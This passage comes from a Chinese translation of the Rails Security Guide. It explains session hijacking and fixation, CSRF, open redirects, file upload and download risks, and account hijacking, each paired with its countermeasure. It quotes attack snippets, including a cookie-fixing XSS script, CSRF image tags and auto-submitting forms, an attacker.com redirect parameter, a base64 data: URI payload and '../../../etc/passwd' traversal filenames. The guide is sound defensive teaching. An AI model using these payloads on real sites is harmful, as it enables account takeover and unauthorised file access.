Ruby on Rails 安全指南
======================

本文介绍 Web 应用常见的安全问题，以及如何在 Rails 中规避。

读完本文后，您将学到：

- 所有需要强调的安全对策；

- Rails 中会话的概念，应该在会话中保存什么内容，以及常见的攻击方式；

- 为什么访问网站也可能带来安全问题（跨站请求伪造）；

- 处理文件或提供管理界面时需要注意的问题；

- 如何管理用户：登录、退出，以及不同层次上的攻击方式；

- 最常见的注入攻击方式。

简介
----

Web 应用框架的作用是帮助开发者创建 Web 应用。其中一些框架还能帮助我们提高 Web 应用的安全性。事实上，框架之间无所谓谁更安全，对许多框架来说，只要使用正确，我们都能开发出安全的应用。Ruby on Rails 提供了一些十分智能的辅助方法，例如，用于防止 SQL 注入的辅助方法，极大减少了这一安全风险。

一般来说，并不存在什么即插即用的安全机制。安全性取决于开发者如何使用框架，有时也取决于开发方式。安全性还取决于 Web 应用环境的各个层面，包括后端存储、Web 服务器和 Web 应用自身等（甚至包括其他 Web 应用）。

不过，据高德纳咨询公司（Gartner Group）估计，75% 的攻击发生在 Web 应用层面，报告称“在进行了安全审计的 300 个网站中，97% 存在被攻击的风险”。这是因为针对 Web 应用的攻击相对来说更容易实施，其工作原理和具体操作都比较简单，即使是非专业人士也能发起攻击。

针对 Web 应用的安全威胁包括账户劫持、绕过访问控制、读取或修改敏感数据，以及显示欺诈信息等。有时，攻击者还会安装木马程序或使用垃圾邮件群发软件，以便获取经济利益，或者通过篡改公司资源来损害品牌形象。为了防止这些攻击，最大限度地降低或消除攻击造成的影响，首先我们必须全面了解各种攻击方式，只有这样才能找出正确对策——这正是本文的主要目的。

为了开发安全的 Web 应用，我们必须从各个层面紧跟安全形势，做到知己知彼。为此，我们可以订阅安全相关的邮件列表，阅读相关博客，同时养成及时更新并定期进行安全检查的习惯（请参阅 [其他资源](#其他资源)）。这些工作都是手动完成的，只有这样我们才能发现潜在的安全隐患。

会话
----

从会话入手来了解安全问题是一个很好的切入点，因为会话对于特定攻击十分脆弱。

### 会话是什么

NOTE: HTTP 是无状态协议，会话使其有状态。

大多数应用需要跟踪特定用户的某些状态，例如购物车里的商品、当前登录用户的 ID 等。如果没有会话，就需要为每一次请求标识用户甚至进行身份验证。当新用户访问应用时，Rails 会自动新建会话，如果用户曾经访问过应用，就会加载已有会话。

会话通常由值的哈希和会话 ID（通常为 32 个字符的字符串）组成，其中会话 ID 用于标识哈希值。发送到客户端浏览器的每个 cookie 都包含会话 ID，另一方面，客户端浏览器发送到服务器的每个请求也包含会话 ID。在 Rails 中，我们可以使用 `session` 方法保存和取回值：

```ruby
session[:user_id] = @current_user.id
User.find(session[:user_id])
```

### 会话 ID

NOTE: 会话 ID 是长度为 32 字节的 MD5 哈希值。

会话 ID 由随机字符串的哈希值组成。这个随机字符串包含当前时间、一个 0 到 1 之间的随机数、Ruby 解析器的进程 ID（基本上也是一个随机数），以及一个常量字符串。目前 Rails 会话 ID 还无法暴力破解。尽管直接破解 MD5 很难，但存在 MD5 碰撞的可能性，理论上可以创建具有相同哈希值的另一个输入文本。不过到目前为止，这个问题还未产生安全影响。

### 会话劫持

WARNING: 通过窃取用户的会话 ID，攻击者能够以受害者的身份使用 Web 应用。

很多 Web 应用都有身份验证系统：用户提供用户名和密码，Web 应用在验证后把对应的用户 ID 储存到会话散列中。之后，会话就可以合法使用了。对于每个请求，应用都会通过识别会话中储存的用户 ID 来加载用户，从而避免了重新进行身份验证。cookie 中的会话 ID 用于标识会话。

因此，cookie 提供了 Web 应用的临时身份验证。只要得到了他人的 cookie，任何人都能以该用户的身份使用 Web 应用，这可能导致严重的后果。下面介绍几种劫持会话的方式及其对策：

- 在不安全的网络中嗅探 cookie。无线局域网就是一个例子。在未加密的无线局域网中，监听所有已连接客户端的流量极其容易。因此，Web 应用开发者应该通过 SSL 提供安全连接。在 Rails 3.1 和更高版本中，可以在应用配置文件中设置强制使用 SSL 连接：

    ``` ruby
    config.force_ssl = true
    ```

- 大多数人在使用公共终端后不会清除 cookie。因此，如果最后一个用户没有退出 Web 应用，后续用户就能以该用户的身份继续使用。因此，Web 应用一定要提供“退出”按钮，并且要尽可能显眼。

- 很多跨站脚本（XSS）攻击的目标是获取用户 cookie。更多介绍请参阅 [跨站脚本（XSS）](#跨站脚本（XSS）)。

- 有的攻击者不窃取 cookie，而是篡改用户 cookie 中的会话 ID。这种攻击方式被称为固定会话攻击，后文会详细介绍。

大多数攻击者的主要目标是赚钱。根据赛门铁克《互联网安全威胁报告》，被窃取的银行登录账户的黑市价格从 10 到 1000 美元不等（取决于账户余额），信用卡卡号为 0.40 到 20 美元，在线拍卖网站的账户为 1 到 8 美元，电子邮件账户密码为 4 到 30 美元。

### 会话安全指南

下面是一些关于会话安全的一般性指南。

- 不要在会话中储存大型对象，而应该把它们储存在数据库中，并将其 ID 保存在会话中。这么做可以避免同步问题，并且不会导致会话存储空间耗尽（会话存储空间的大小取决于其类型，详见后文）。如果不这么做，当修改了对象结构时，用户 cookie 中保存的仍然是对象的旧版本。通过在服务器端储存会话，我们可以轻而易举地清除会话，而在客户端储存会话，要想清除会话就很麻烦了。

- 关键数据不应该储存在会话中。如果用户清除了 cookie 或关闭了浏览器，这些关键数据就会丢失。而且，在客户端储存会话，用户还能读取关键数据。

### 会话存储

NOTE: Rails 提供了几种会话散列的存储机制。其中最重要的是 `ActionDispatch::Session::CookieStore`。

Rails 2 引入了一种新的默认会话存储机制——CookieStore。CookieStore 把会话散列直接储存在客户端的 cookie 中。无需会话 ID，服务器就可以从 cookie 中取回会话散列。这么做可以显著提高应用的运行速度，但也存在争议，因为这种存储机制具有下列安全隐患：

- cookie 的大小被严格限制为 4 KB。这个限制本身没问题，因为如前文所述，本来就不应该在会话中储存大量数据。在会话中储存当前用户的数据库 ID 一般没问题。

- 客户端可以看到储存在会话中的所有内容，因为数据是以明文形式储存的（实际上是 Base64 编码，因此没有加密）。因此，我们不应该在会话中储存隐私数据。为了防止会话散列被篡改，应该根据服务器端密令（`secrets.secret_token`）计算会话的摘要（digest），然后把这个摘要添加到 cookie 的末尾。

不过，从 Rails 4 开始，默认存储机制是 EncryptedCookieStore。EncryptedCookieStore 会先对会话进行加密，再储存到 cookie 中。这么做可以防止用户访问和篡改 cookie 的内容。因此，会话也成为储存数据的更安全的地方。加密时需要使用 `config/secrets.yml` 文件中储存的服务器端密钥 `secrets.secret_key_base`。

这意味着 EncryptedCookieStore 存储机制的安全性由密钥（以及摘要算法，出于兼容性考虑默认为 SHA1 算法）决定。因此，密钥不能随意取值，例如从字典中找一个单词，或少于 30 个字符，而应该使用 `rails secret` 命令生成。

`secrets.secret_key_base` 用于指定密钥，在应用中会话使用这个密钥来验证已知密钥，以防被篡改。在创建应用时，`config/secrets.yml` 文件中储存的 `secrets.secret_key_base` 是一个随机密钥，例如：

```yml
development:
  secret_key_base: a75d...

test:
  secret_key_base: 492f...

production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
```

Rails 老版本中的 CookieStore 使用的是 `secret_token`，而不是 EncryptedCookieStore 所使用的 `secret_key_base`。更多介绍请参阅升级文档。

如果应用的密钥泄露了（例如应用开放了源代码），强烈建议更换密钥。

### 对 CookieStore 会话的重放攻击

NOTE: 重放攻击（replay attack）是使用 CookieStore 时必须注意的另一种攻击方式。

重放攻击的工作原理如下：

- 用户获得的信用额度保存在会话中（信用额度实际上不应该保存在会话中，这里只是出于演示目的才这样做）；

- 用户使用部分信用额度购买商品；

- 减少后的信用额度仍然保存在会话中；

- 用户先前复制了第一步中的 cookie，并用这个 cookie 替换浏览器中的当前 cookie；

- 用户重新获得了消费前的信用额度。

在会话中包含随机数可以防止重放攻击。每个随机数验证一次后就会失效，服务器必须跟踪所有有效的随机数。当有多个应用服务器时，情况会变得更复杂，因为我们不能把随机数储存在数据库中，否则就违背了使用 CookieStore 的初衷（避免访问数据库）。

因此，防止重放攻击的最佳方案，不是把这类敏感数据储存在会话中，而是把它们储存在数据库中。回到上面的例子，我们可以把信用额度储存在数据库中，而把当前用户的 ID 储存在会话中。

### 会话固定攻击

NOTE: 除了窃取用户的会话 ID 之外，攻击者还可以直接使用已知的会话 ID。这种攻击方式被称为会话固定（session fixation）攻击。

![session fixation](session_fixation.png)

会话固定攻击的关键是强制用户的浏览器使用攻击者已知的会话 ID，这样攻击者就无需窃取会话 ID。会话固定攻击的工作原理如下：

- 攻击者创建一个有效的会话 ID：打开 Web 应用的登录页面，从响应中获取 cookie 中的会话 ID（参见上图中的第 1 和第 2 步）。

- 攻击者定期访问 Web 应用，以避免会话过期。

- 攻击者强制用户的浏览器使用这个会话 ID（参见上图中的第 3 步）。由于无法修改另一个域名的 cookie（基于同源原则的限制），攻击者必须在目标 Web 应用的域名上运行 JavaScript，也就是通过 XSS 把 JavaScript 注入目标 Web 应用来完成攻击。例如：`<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。关于 XSS 和注入的更多介绍见后文。

- 攻击者诱使用户访问包含恶意 JavaScript 代码的页面，这样用户的浏览器中的会话 ID 就会被篡改为攻击者已知的会话 ID。

- 由于这个被篡改的会话还未使用过，Web 应用会进行身份验证。

- 此后，用户和攻击者将共用同一个会话来访问 Web 应用。攻击者篡改后的会话成为了有效会话，用户面对攻击却浑然不知。

### 会话固定攻击的对策

TIP: 一行代码就能保护我们免受会话固定攻击。

面对会话固定攻击，最有效的对策是在登录成功后重新设置会话 ID，并使原有会话 ID 失效，这样攻击者持有的会话 ID 也就失效了。这也是防止会话劫持的有效对策。在 Rails 中重新设置会话 ID 的方式如下：

```ruby
reset_session
```

如果使用流行的 [Devise](https://rubygems.org/gems/devise) gem 管理用户，Devise 会在用户登录和退出时自动使原有会话过期。如果打算手动完成用户管理，请记住在登录操作后（新会话创建后）使原有会话过期。会话过期后其中的值都会被删除，因此我们需要把有用的值转移到新会话中。

另一个对策是在会话中保存用户相关的属性，对于每次请求都验证这些属性，如果信息不匹配就拒绝访问。这些属性包括 IP 地址、用户代理（Web 浏览器名称），其中用户代理的用户相关性要弱一些。在保存 IP 地址时，必须注意，有些网络服务提供商（ISP）或大型组织，会把用户置于代理服务器之后。在会话的生命周期中，这些代理服务器有可能发生变化，从而导致用户无法正常使用应用，或出现权限问题。

### 会话过期

NOTE: 永不过期的会话增加了跨站请求伪造（CSRF）、会话劫持和会话固定攻击的风险。

cookie 的过期时间可以通过会话 ID 设置。然而，客户端能够修改储存在 Web 浏览器中的 cookie，因此在服务器上使会话过期更安全。下面的例子演示如何使储存在数据库中的会话过期。通过调用 `Session.sweep("20 minutes")`，可以使闲置超过 20 分钟的会话过期。

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    if time.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end

    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
end
```

[会话固定攻击](#会话固定攻击)介绍了维护会话的问题。攻击者每五分钟维护一次会话，就可以使会话永远保持活动，不至过期。针对这个问题的一个简单解决方案是在会话数据表中添加 `created_at` 字段，这样就可以找出创建了很长时间的会话并删除它们。可以用下面这行代码代替上面例子中的对应代码：

```ruby
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
```

跨站请求伪造（CSRF）
--------------------

跨站请求伪造的工作原理是，通过在页面中包含恶意代码或链接，访问已验证用户才能访问的 Web 应用。如果该 Web 应用的会话未超时，攻击者就能执行未经授权的操作。

![csrf](csrf.png)

在 [会话](#会话)中，我们了解到大多数 Rails 应用都使用基于 cookie 的会话。它们或者把会话 ID 储存在 cookie 中并在服务器端储存会话散列，或者把整个会话散列储存在客户端。不管是哪种情况，只要浏览器能够找到某个域名对应的 cookie，就会自动在发送请求时包含该 cookie。有争议的是，即便请求来源于另一个域名上的网站，浏览器在发送请求时也会包含客户端的 cookie。让我们来看个例子：

- Bob 在访问留言板时浏览了一篇黑客发布的帖子，其中有一个精心设计的 HTML 图像元素。这个元素实际指向的是 Bob 的项目管理应用中的某个操作，而不是真正的图像文件：`<img src="http://www.webapp.com/project/1/destroy">`。

- Bob 在 www.webapp.com 上的会话仍然是活动的，因为几分钟前他访问这个应用后没有退出。

- 当 Bob 浏览这篇帖子时，浏览器发现了这个图像标签，于是尝试从 www.webapp.com 中加载图像。如前文所述，浏览器在发送请求时包含 cookie，其中就有有效的会话 ID。

- www.webapp.com 上的 Web 应用会验证对应会话散列中的用户信息，并删除 ID 为 1 的项目，然后返回结果页面。由于返回的并非浏览器所期待的结果，图像无法显示。

- Bob 当时并未发觉受到了攻击，但几天后，他发现 ID 为 1 的项目不见了。

有一点需要特别注意，像上面这样精心设计的图像或链接，并不一定要出现在 Web 应用所在的域名上，而是可以出现在任何地方，例如论坛、博客帖子，甚至电子邮件中。

CSRF 在 CVE（Common Vulnerabilities and Exposures，公共漏洞披露）中很少出现，在 2006 年不到 0.1%，但却是个可怕的隐形杀手。对于很多安全保障工作来说，CSRF 是一个严重的安全问题。

### CSRF 对策

NOTE: 首先，根据 W3C 的要求，应该适当地使用 `GET` 和 `POST` HTTP 方法。其次，在非 GET 请求中使用安全令牌（security token）可以防止应用受到 CSRF 攻击。

HTTP 协议提供了两种主要的基本请求类型，`GET` 和 `POST`（还有其他请求类型，但大多数浏览器不支持）。万维网联盟（W3C）提供了检查表，以帮助开发者在 `GET` 和 `POST` 这两个 HTTP 方法之间做出正确选择：

使用 `GET` HTTP 方法的情形：

- 当交互更像是在询问时，例如查询、读取、查找等安全操作。

使用 `POST` HTTP 方法的情形：

- 当交互更像是在执行命令时；

- 当交互改变了资源的状态并且这种变化能够被用户察觉时，例如订阅某项服务；

- 当用户需要对交互结果负责时。

如果应用是 REST 式的，还可以使用其他 HTTP 方法，例如 `PATCH`、`PUT` 或 `DELETE`。然而现今的大多数浏览器都不支持这些 HTTP 方法，只有 `GET` 和 `POST` 得到了普遍支持。Rails 通过隐藏的 `_method` 字段来解决这个问题。

`POST` 请求也可以自动发送。在下面的例子中，链接 www.harmless.com 在浏览器状态栏中显示为目标地址，实际上却动态新建了一个发送 POST 请求的表单：

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
```

攻击者还可以把代码放在图片的 `onmouseover` 事件句柄中：

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

CSRF 还有很多可能的攻击方式，例如使用 `<script>` 标签向返回 JSONP 或 JavaScript 的 URL 地址发起跨站请求。对跨站请求的响应，返回的如果是攻击者可以设法运行的可执行代码，就有可能导致敏感数据泄露。为了避免发生这种情况，必须禁用跨站 `<script>` 标签。不过 Ajax 请求是遵循同源原则的（只有在同一个网站中才能初始化 `XmlHttpRequest`），因此在响应 Ajax 请求时返回 JavaScript 是安全的，不必担心跨站请求问题。

注意：我们无法区分 `<script>` 标签的来源，无法知道这个标签是自己网站上的，还是其他恶意网站上的，因此我们必须全面禁止 `<script>` 标签，哪怕这个标签实际上来源于自己网站上的安全的同源脚本。在这种情况下，对于返回 JavaScript 的控制器动作，显式跳过 CSRF 保护，就意味着允许使用 `<scipt>` 标签。

为了防止其他各种伪造请求，我们引入了安全令牌，这个安全令牌只有我们自己的网站知道，其他网站不知道。我们把安全令牌包含在请求中，并在服务器上进行验证。安全令牌在应用的控制器中使用下面这行代码设置，这也是新建 Rails 应用的默认值：

```ruby
protect_from_forgery with: :exception
```

这行代码会在 Rails 生成的所有表单和 Ajax 请求中包含安全令牌。如果安全令牌验证失败，就会抛出异常。

NOTE: 默认情况下，Rails 会包含 jQuery 和 jQuery 非侵入式适配器，后者会在 jQuery 的每个非 GET Ajax 调用中添加名为 `X-CSRF-Token` 的首部，其值为安全令牌。如果没有这个首部，Rails 不会接受非 GET Ajax 请求。使用其他库调用 Ajax 时，同样要在默认首部中添加 `X-CSRF-Token`。要想获取令牌，请查看应用视图中由 `<%= csrf_meta_tags %>` 这行代码生成的 `<meta name='csrf-token' content='THE-TOKEN'>` 标签。

通常我们会使用持久化 cookie 来储存用户信息，例如使用 `cookies.permanent`。在这种情况下，cookie 不会被清除，CSRF 保护也无法自动生效。如果使用其他 cookie 存储器而不是会话来保存用户信息，我们就必须手动解决这个问题：

```ruby
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # 删除用户 cookie 的示例方法
end
```

这段代码可以放在 `ApplicationController` 中。对于非 GET 请求，如果 CSRF 令牌不存在或不正确，就会执行这段代码。

注意，跨站脚本（XSS）漏洞能够绕过所有 CSRF 保护措施。攻击者通过 XSS 可以访问页面中的所有元素，也就是说攻击者可以读取表单中的 CSRF 安全令牌，也可以直接提交表单。更多介绍请参阅 [跨站脚本（XSS）](#跨站脚本（XSS）)。

重定向和文件
------------

另一类安全漏洞由 Web 应用中的重定向和文件引起。

### 重定向

WARNING: Web 应用中的重定向是一个被低估的黑客工具：攻击者不仅能够把用户的访问跳转到恶意网站，还能够发起独立攻击。

只要允许用户指定 URL 重定向地址（或其中的一部分），就有可能造成风险。最常见的攻击方式是，把用户重定向到假冒的 Web 应用，这个假冒的 Web 应用看起来和真的一模一样。这就是所谓的钓鱼攻击。攻击者发动钓鱼攻击时，或者给用户发送包含恶意链接的邮件，或者通过 XSS 在 Web 应用中注入恶意链接，或者把恶意链接放入其他网站。这些恶意链接一般不会引起用户的怀疑，因为它们以正常的网站 URL 开头，而把恶意网站的 URL 隐藏在重定向参数中，例如 http://www.example.com/site/redirect?to=www.attacker.com。让我们来看一个例子：

```ruby
def legacy
  redirect_to(params.update(action:'main'))
end
```

如果用户访问 `legacy` 动作，就会被重定向到 `main` 动作，同时传递给 `legacy` 动作的 URL 参数会被保留并传递给 `main` 动作。然而，攻击者通过在 URL 地址中包含 `host` 参数就可以发动攻击：

    http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com

如果 `host` 参数出现在 URL 地址末尾，将很难被注意到，从而会把用户重定向到 www.attacker.com 这个恶意网站。一个简单的对策是，在 `legacy` 动作中只保留所期望的参数（使用白名单，而不是去删除不想要的参数）。对于用户指定的重定向 URL 地址，应该通过白名单或正则表达式进行检查。

#### 独立的 XSS

在 Firefox 和 Opera 浏览器中，通过使用 data 协议，还能发起另一种重定向和独立 XSS 攻击。data 协议允许把内容直接显示在浏览器中，支持的类型包括 HTML、JavaScript 和图像，例如：

    data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

这是一段使用 Base64 编码的 JavaScript 代码，运行后会显示一个消息框。通过这种方式，攻击者可以使用恶意代码把用户重定向到恶意网站。为了防止这种攻击，我们的对策是禁止用户指定 URL 重定向地址。

### 文件上传

NOTE: 请确保文件上传时不会覆盖重要文件，同时对于媒体文件应该采用异步上传方式。

很多 Web 应用都允许用户上传文件。由于文件名通常由用户指定（或部分指定），必须对文件名进行过滤，以防止攻击者通过指定恶意文件名覆盖服务器上的文件。如果我们把上传的文件储存在 `/var/www/uploads` 文件夹中，而用户输入了类似 `../../../etc/passwd` 的文件名，在没有对文件名进行过滤的情况下，`passwd` 这个重要文件就有可能被覆盖。当然，只有在 Ruby 解析器具有足够权限时文件才会被覆盖，这也是不应该使用 Unix 特权用户运行 Web 服务器、数据库服务器和其他应用的原因之一。

在过滤用户输入的文件名时，不要去尝试删除文件名的恶意部分。我们可以设想这样一种情况，Web 应用把文件名中所有的 `../` 都删除了，但攻击者使用的是 `....//`，于是过滤后的文件名中仍然包含 `../`。最佳策略是使用白名单，只允许在文件名中使用白名单中的字符。黑名单的做法是尝试删除禁止使用的字符，白名单的做法恰恰相反。对于无效的文件名，可以直接拒绝（或者把禁止使用的字符都替换掉），但不要尝试删除禁止使用的字符。下面这个文件名净化程序摘自 [attachment\_fu](https://github.com/technoweenie/attachment_fu/tree/master) 插件：

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
```

通过同步方式上传文件（`attachment_fu` 插件也能用于上传图像）的一个明显缺点是，存在受到拒绝服务攻击（denial-of-service，简称 DoS）的风险。攻击者可以通过很多计算机同时上传图像，这将导致服务器负载增加，并最终导致应用崩溃或服务器宕机。

最佳解决方案是，对于媒体文件采用异步上传方式：保存媒体文件，并通过数据库调度程序处理请求。由另一个进程在后台完成文件上传。

### 上传文件中的可执行代码

WARNING: 如果把上传的文件储存在某些特定的文件夹中，文件中的源代码就有可能被执行。因此，如果 Rails 应用的 `/public` 文件夹被设置为 Apache 的主目录，请不要在这个文件夹中储存上传的文件。

流行的 Apache Web 服务器的配置文件中有一个名为 `DocumentRoot` 的选项，用于指定网站的主目录。主目录及其子文件夹中的所有内容都由 Web 服务器直接处理。如果其中包含一些具有特定扩展名的文件，就能够通过 HTTP 请求执行这些文件中的代码（可能还需要设置一些选项），例如 PHP 和 CGI 文件。假设攻击者上传了 `file.cgi` 文件，其中包含可执行代码，那么之后有人下载这个文件时，里面的代码就会在服务器上执行。

如果 Apache 的 `DocumentRoot` 选项指向 Rails 的 `/public` 文件夹，请不要在其中储存上传的文件，至少也应该储存在子文件夹中。

### 文件下载

NOTE: 请确保用户不能随意下载文件。

正如在上传文件时必须过滤文件名，在下载文件时也必须进行过滤。`send_file()` 方法用于把服务器上的文件发送到客户端。如果传递给 `send_file()` 方法的文件名参数是由用户输入的，却没有进行过滤，用户就能够下载服务器上的任何文件：

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

可以看到，只要指定 `../../../etc/passwd` 这样的文件名，用户就可以下载服务器登录信息。对此，一个简单的解决方案是，检查所请求的文件是否在规定的文件夹中：

```ruby
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'
```

另一个（附加的）解决方案是在数据库中储存文件名，并以数据库中的记录 ID 作为文件名，把文件保存到磁盘。这样做还能有效防止上传的文件中的代码被执行。`attachment_fu` 插件的工作原理类似。

局域网和管理界面的安全
----------------------

由于具有访问特权，局域网和管理界面成为了常见的攻击目标。因此理应为它们采取多种安全防护措施，然而实际情况却不理想。

2007 年，第一个在局域网中窃取信息的专用木马出现了，它的名字叫“员工怪兽”（Monster for employers），用于攻击在线招聘网站 Monster.com。专用木马非常少见，迄今为止造成的安全风险也相当低，但这种攻击方式毕竟是存在的，说明客户端的安全问题不容忽视。然而，对局域网和管理界面而言，最大的安全威胁来自 XSS 和 CSRF。

**XSS**

如果在应用中显示了来自外网的恶意内容，应用就有可能受到 XSS 攻击。例如用户名、用户评论、垃圾信息报告、订单地址等等，都有可能受到 XSS攻击。

在局域网和管理界面中，只要有一个地方没有对输入进行过滤，整个应用就有可能受到 XSS 攻击。可能发生的攻击包括：窃取具有特权的管理员的 cookie、注入 iframe 以窃取管理员密码，以及通过浏览器漏洞安装恶意软件以控制管理员的计算机。

关于 XSS 攻击的对策，请参阅 [注入攻击](#注入攻击)。在局域网和管理界面中同样推荐使用 `SafeErb` 插件。

**CSRF**

跨站请求伪造（CSRF），也称为跨站引用伪造（XSRF），是一种破坏性很强的攻击方法，它允许攻击者完成管理员或局域网用户可以完成的一切操作。前文我们已经介绍过 CSRF 的工作原理，下面是攻击者针对局域网和管理界面发动 CSRF 攻击的几个例子。

一个真实的案例是[通过 CSRF 攻击重新设置路由器](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html)。攻击者向墨西哥用户发送包含 CSRF 代码的恶意电子邮件。邮件声称用户收到了一张电子贺卡，其中包含一个能够发起 HTTP GET 请求的图像标签，以便重新设置用户的路由器（针对一款在墨西哥很常见的路由器）。攻击改变了路由器的 DNS 设置，当用户访问墨西哥境内银行的网站时，就会被带到攻击者的网站。通过受攻击的路由器访问银行网站的所有用户，都会被带到攻击者的假冒网站，最终导致用户的网银账号失窍。

另一个例子是修改 Google Adsense 账户的电子邮件和密码。一旦受害者登录 Google Adsense，打算对自己投放的 Google 广告进行管理，攻击者就能够趁机修改受害者的登录信息。

还有一种常见的攻击方式是在 Web 应用中大量发布垃圾信息，通过博客、论坛来传播 XSS 恶意脚本。当然，攻击者还得知道 URL 地址的结构才能发动攻击，但是大多数 Rails 应用的 URL 地址结构都很简单，很容易就能搞清楚，对于开源应用的管理界面更是如此。通过包含恶意图片标签，攻击者甚至可以进行上千次猜测，把 URL 地址结构所有可能的组合都尝试一遍。

关于针对局域网和管理界面发动的 CSRF 攻击的对策，请参阅 [CSRF 对策](#CSRF 对策)。

### 其他预防措施

通用管理界面的一般工作原理如下：通过 www.example.com/admin 访问，访问仅限于 `User` 模型的 `admin` 字段设置为 `true` 的用户。管理界面中会列出用户输入的数据，管理员可以根据需要对数据进行删除、添加或修改。下面是关于管理界面的一些参考意见：

- 考虑最坏的情况非常重要：如果有人真的得到了用户的 cookie 或账号密码怎么办？可以为管理界面引入用户角色权限设计，以限制攻击者的权限。或者为管理界面启用特殊的登录账号密码，而不采用应用的其他部分所使用的账号密码。对于特别重要的操作，还可以要求用户输入专用密码。

- 管理员真的有可能从世界各地访问管理界面吗？可以考虑对登录管理界面的 IP 段进行限制。用户的 IP 地址可以通过 `request.remote_ip` 获取。这个解决方案虽然不能说万无一失，但确实为管理界面筑起了一道坚实的防线。不过在实际操作中，还要注意用户是否使用了代理服务器。

- 通过专用子域名访问管理界面，如 admin.application.com，并为管理界面建立独立的应用和账户系统。这样，攻击者就无法从日常使用的域名（如 www.application.com）中窃取管理员的 cookie。其原理是：基于浏览器的同源原则，在 www.application.com 中注入的 XSS 脚本，无法读取 admin.application.com 的 cookie，反之亦然。

用户管理
--------

NOTE: 几乎每个 Web 应用都必须处理授权和身份验证。自己实现这些功能并非首选，推荐的做法是使用插件。但在使用插件时，一定要记得及时更新。此外，还有一些预防措施可以使我们的应用更安全。

Rails 有很多可用的身份验证插件，其中有不少佳作，例如 [devise](https://github.com/plataformatec/devise) 和 [authlogic](https://github.com/binarylogic/authlogic)。这些插件只储存加密后的密码，而不储存明文密码。从 Rails 3.1 起，我们可以使用实现了类似功能的 `has_secure_password` 内置方法。

每位新注册用户都会收到一封包含激活码和激活链接的电子邮件，以便激活账户。账户激活后，该用户的数据库记录的 `activation_code` 字段会被设置为 `NULL`。如果有人访问了下列 URL 地址，就有可能以数据库中找到的第一个已激活用户的身份登录（有可能是管理员）：

    http://localhost:3006/user/activate
    http://localhost:3006/user/activate?id=

之所以出现这种可能性，是因为对于某些服务器，ID 参数 `params[:id]` 的值是 `nil`，而查找激活码的代码如下：

```ruby
User.find_by_activation_code(params[:id])
```

当 ID 参数为 `nil` 时，生成的 SQL 查询如下：

```sql
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
```

因此，查询结果是数据库中的第一个已激活用户，随后将以这个用户的身份登录。关于这个问题的更多介绍，请参阅[这篇博客文章](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)。在使用插件时，建议及时更新。此外，通过代码审查可以找出应用的更多类似缺陷。

### 暴力破解账户

NOTE: 对账户的暴力攻击是指对登录的账号密码进行试错攻击。通过显示较为模糊的错误信息、要求输入验证码等方式，可以增加暴力破解的难度。

Web 应用的用户名列表有可能被滥用于暴力破解密码，因为大多数用户并没有使用复杂密码。大多数密码是字典中的单词组合，或单词和数字的组合。有了用户名列表和字典，自动化程序在几分钟内就可能找到正确密码。

因此，如果登录时用户名或密码不正确，大多数 Web 应用都会显示较为模糊的错误信息，如“用户名或密码不正确”。如果提示“未找到您输入的用户名”，攻击者就可以根据错误信息，自动生成精简后的有效用户名列表，从而提高攻击效率。

不过，容易被大多数 Web 应用设计者忽略的，是忘记密码页面。通过这个页面，通常能够确认用户名或电子邮件地址是否有效，攻击者可以据此生成用于暴力破解的用户名列表。

为了规避这种攻击，忘记密码页面也应该显示较为模糊的错误信息。此外，当某个 IP 地址多次登录失败时，可以要求输入验证码。但是要注意，这并非防范自动化程序的万无一失的解决方案，因为这些程序可能会频繁更换 IP 地址，不过毕竟还是筑起了一道防线。

### 账户劫持

对很多 Web 应用来说，实施账户劫持是一件很容易的事情。既然这样，为什么不尝试改变，想办法增加账户劫持的难度呢？

#### 密码

假设攻击者窃取了用户会话的 cookie，从而能够像用户一样使用应用。此时，如果修改密码很容易，攻击者只需点击几次鼠标就能劫持该账户。另一种可能性是，修改密码的表单容易受到 CSRF 攻击，攻击者可以诱使受害者访问包含精心设计的图像标签的网页，通过 CSRF 窃取密码。针对这种攻击的对策是，在修改密码的表单中加入 CSRF 防护，同时要求用户在修改密码时先输入旧密码。

#### 电子邮件

然而，攻击者还能通过修改电子邮件地址来劫持账户。一旦攻击者修改了账户的电子邮件地址，他们就会进入忘记密码页面，通过新邮件地址接收找回密码邮件。针对这种攻击的对策是，要求用户在修改电子邮件地址时同样先输入旧密码。

#### 其他

针对不同的 Web 应用，还可能存在更多的劫持用户账户的攻击方式。这些攻击方式大都借助于 CSRF 和 XSS，例如 [Gmail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/) 的 CSRF 漏洞。在这种概念验证攻击中，攻击者诱使受害者访问自己控制的网站，其中包含了精心设计的图像标签，然后通过 HTTP GET 请求修改 Gmail 的过滤器设置。如果受害者已经登录了 Gmail，攻击者就能通过修改后的过滤器把受害者的所有电子邮件转发到自己的电子邮件地址。这种攻击的危害性几乎和劫持账户一样大。针对这种攻击的对策是，通过代码审查封堵所有 XSS 和 CSRF 漏洞。

### 验证码

